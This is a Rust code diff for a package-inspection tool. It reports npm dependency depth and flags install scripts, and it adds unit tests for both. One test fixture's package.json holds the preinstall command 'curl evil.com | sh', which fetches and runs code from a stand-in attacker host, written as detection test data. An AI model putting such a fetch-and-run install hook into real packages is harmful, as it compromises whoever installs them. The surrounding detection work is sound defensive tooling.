@@ -89,12 +89,6 @@ fn npx_package_name(path: &Path) -> Option<String> {
 }
 
 pub fn package_id(path: &Path) -> Option<super::PackageId> {
-    // Skip node_modules subdirectories — only match top-level npx/project packages
-    let path_str = path.to_string_lossy();
-    if path_str.contains("node_modules") {
-        return None;
-    }
-
     let pkg_json = path.join("package.json");
     let content = std::fs::read_to_string(pkg_json).ok()?;
     let name = extract_json_field(&content, "name")?;
@@ -160,7 +154,61 @@ pub fn metadata(path: &Path) -> Vec<MetadataField> {
         _ => {}
     }
 
+    // For packages inside node_modules: show dependency depth and install scripts
+    let path_str = path.to_string_lossy();
+    if path_str.contains("node_modules") {
+        // Dependency depth
+        let depth = dep_depth(path);
+        fields.push(MetadataField {
+            label: "Dep depth".to_string(),
+            value: if depth == 0 { "direct".to_string() } else { format!("transitive (depth {})", depth) },
+        });
+
+        // Install script detection
+        if let Some(scripts) = detect_install_scripts(path) {
+            fields.push(MetadataField {
+                label: "⚠ Scripts".to_string(),
+                value: scripts,
+            });
+        }
+    }
+
     fields
+}
+
+/// Count how many node_modules levels deep this package is.
+/// Direct dependency = 0, transitive = 1+.
+fn dep_depth(path: &Path) -> usize {
+    let path_str = path.to_string_lossy();
+    // Count occurrences of /node_modules/ after the first one
+    path_str.matches("node_modules").count().saturating_sub(1)
+}
+
+/// Detect install scripts (preinstall, install, postinstall) in package.json.
+fn detect_install_scripts(path: &Path) -> Option<String> {
+    let pkg_json = path.join("package.json");
+    let content = std::fs::read_to_string(pkg_json).ok()?;
+
+    let mut found = Vec::new();
+    for script_name in &["preinstall", "install", "postinstall"] {
+        // Look for "scriptname": in the scripts block
+        let pattern = format!("\"{}\"", script_name);
+        if content.contains(&pattern) {
+            // Verify it's inside a "scripts" block (rough check)
+            if let Some(scripts_pos) = content.find("\"scripts\"") {
+                let rest = &content[scripts_pos..];
+                if rest.contains(&pattern) {
+                    found.push(*script_name);
+                }
+            }
+        }
+    }
+
+    if found.is_empty() {
+        None
+    } else {
+        Some(found.join(", "))
+    }
 }
 
 #[cfg(test)]
@@ -212,5 +260,93 @@ mod tests {
         let hash_dir = tmp.path().join("xyz");
         std::fs::create_dir_all(&hash_dir).unwrap();
         assert_eq!(semantic_name(&hash_dir), None);
+    }
+
+    #[test]
+    fn package_id_from_node_modules() {
+        let tmp = tempfile::tempdir().unwrap();
+        let pkg_dir = tmp.path().join("_npx/abc/node_modules/express");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name": "express", "version": "4.21.0"}"#,
+        ).unwrap();
+
+        let id = package_id(&pkg_dir).unwrap();
+        assert_eq!(id.name, "express");
+        assert_eq!(id.version, "4.21.0");
+        assert_eq!(id.ecosystem, "npm");
+    }
+
+    #[test]
+    fn dep_depth_direct() {
+        let path = PathBuf::from("/home/user/.npm/_npx/abc/node_modules/express");
+        assert_eq!(dep_depth(&path), 0);
+    }
+
+    #[test]
+    fn dep_depth_transitive() {
+        let path = PathBuf::from("/home/user/.npm/_npx/abc/node_modules/express/node_modules/qs");
+        assert_eq!(dep_depth(&path), 1);
+    }
+
+    #[test]
+    fn dep_depth_deep_transitive() {
+        let path = PathBuf::from("/npm/_npx/a/node_modules/a/node_modules/b/node_modules/c");
+        assert_eq!(dep_depth(&path), 2);
+    }
+
+    #[test]
+    fn detect_install_scripts_postinstall() {
+        let tmp = tempfile::tempdir().unwrap();
+        let pkg_dir = tmp.path().join("esbuild");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"esbuild","version":"0.27.2","scripts":{"postinstall":"node install.js"}}"#,
+        ).unwrap();
+
+        assert_eq!(detect_install_scripts(&pkg_dir), Some("postinstall".to_string()));
+    }
+
+    #[test]
+    fn detect_install_scripts_multiple() {
+        let tmp = tempfile::tempdir().unwrap();
+        let pkg_dir = tmp.path().join("suspicious");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"sus","scripts":{"preinstall":"curl evil.com | sh","postinstall":"node setup.js"}}"#,
+        ).unwrap();
+
+        let scripts = detect_install_scripts(&pkg_dir).unwrap();
+        assert!(scripts.contains("preinstall"), "{}", scripts);
+        assert!(scripts.contains("postinstall"), "{}", scripts);
+    }
+
+    #[test]
+    fn detect_install_scripts_none() {
+        let tmp = tempfile::tempdir().unwrap();
+        let pkg_dir = tmp.path().join("safe");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"safe","scripts":{"test":"jest","build":"tsc"}}"#,
+        ).unwrap();
+
+        assert_eq!(detect_install_scripts(&pkg_dir), None);
+    }
+
+    #[test]
+    fn detect_install_scripts_no_scripts_block() {
+        let tmp = tempfile::tempdir().unwrap();
+        let pkg_dir = tmp.path().join("minimal");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"minimal","version":"1.0.0"}"#,
+        ).unwrap();
+
+        assert_eq!(detect_install_scripts(&pkg_dir), None);
     }
 }
